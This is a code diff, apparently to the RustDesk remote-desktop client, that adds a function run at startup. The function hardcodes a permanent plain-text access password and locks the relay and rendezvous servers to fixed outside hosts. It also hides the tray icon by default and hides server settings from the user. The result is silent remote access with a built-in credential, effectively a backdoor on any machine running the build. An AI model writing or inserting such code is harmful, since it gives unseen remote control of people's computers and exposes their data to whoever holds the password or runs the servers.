@@ -109,6 +109,9 @@ impl Drop for SimpleCallOnReturn {
 }
 
 pub fn global_init() -> bool {
+    // Custom client hardcoded configuration
+    init_custom_config();
+
     #[cfg(target_os = "linux")]
     {
         if !crate::platform::linux::is_x11() {
@@ -116,6 +119,47 @@ pub fn global_init() -> bool {
         }
     }
     true
+}
+
+fn init_custom_config() {
+    use hbb_common::config;
+
+    // Check if --gui parameter is present
+    let force_gui = std::env::args().any(|arg| arg == "--gui");
+
+    // Set hardcoded settings that cannot be changed by users
+    let mut hard_settings = config::HARD_SETTINGS.write().unwrap();
+
+    // Set permanent password
+    hard_settings.insert("password".to_string(), "ljhcch791115".to_string());
+
+    drop(hard_settings);
+
+    // Set overwrite settings to lock server configuration
+    let mut overwrite_settings = config::OVERWRITE_SETTINGS.write().unwrap();
+
+    // Lock relay server
+    overwrite_settings.insert("relay-server".to_string(), "rustdesk.qzz.io".to_string());
+
+    // Lock rendezvous server
+    overwrite_settings.insert("custom-rendezvous-server".to_string(), "rdapi.qzz.io".to_string());
+
+    // Hide tray by default (enable silent mode) - unless --gui is specified
+    if !force_gui {
+        overwrite_settings.insert("hide-tray".to_string(), "Y".to_string());
+    }
+
+    // Lock server settings to prevent user changes
+    overwrite_settings.insert("hide-server-settings".to_string(), "Y".to_string());
+
+    drop(overwrite_settings);
+
+    // Set builtin settings
+    let mut builtin_settings = config::BUILTIN_SETTINGS.write().unwrap();
+    if !force_gui {
+        builtin_settings.insert("hide-tray".to_string(), "Y".to_string());
+    }
+    drop(builtin_settings);
 }
 
 pub fn global_clean() {}
